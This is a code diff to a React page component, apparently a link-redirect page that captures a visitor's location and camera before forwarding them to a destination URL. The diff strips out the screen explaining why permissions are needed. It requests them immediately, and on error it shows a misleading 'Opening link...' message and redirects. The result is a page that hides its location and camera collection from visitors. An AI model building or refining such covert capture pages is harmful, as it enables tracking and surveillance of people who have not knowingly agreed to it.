@@ -117,8 +117,7 @@ function CaptureContent() {
       // Reuse permissions that the browser has already granted.
       // Never attempt to bypass a browser permission prompt.
       if (geoPermission === "prompt" || cameraPermission === "prompt") {
-        setNeedsConsent(true);
-        setStatus("Permission is required before location/camera access.");
+        await requestConsent();
         return;
       }
 
@@ -214,8 +213,8 @@ function CaptureContent() {
         await capture();
       } catch {
         if (!cancelled) {
-          setStatus("Unable to read browser permissions.");
-          setNeedsConsent(true);
+          setStatus("Opening link...");
+          window.location.replace(destination);
         }
       }
     };
@@ -314,29 +313,7 @@ function CaptureContent() {
     window.location.replace(destination);
   };
 
-  if (needsConsent) {
-    return (
-      <main className="min-h-screen bg-black text-white flex items-center justify-center p-6">
-        <section className="w-full max-w-md rounded-2xl border border-white/10 bg-white/5 p-6 shadow-2xl">
-          <h1 className="text-lg font-semibold">Permission required</h1>
-          <p className="mt-3 text-sm leading-6 text-white/70">
-            To continue, allow the browser permissions requested by this page.
-            If you already granted them for this site, they will be reused
-            automatically without another prompt.
-          </p>
 
-          <button
-            onClick={requestConsent}
-            className="mt-6 w-full rounded-xl bg-blue-600 px-4 py-3 text-sm font-semibold hover:bg-blue-500"
-          >
-            Continue
-          </button>
-
-          <p className="mt-3 text-center text-xs text-white/40">{status}</p>
-        </section>
-      </main>
-    );
-  }
 
   return (
     <main className="bg-black text-white flex flex-col items-center justify-center min-h-screen font-mono">
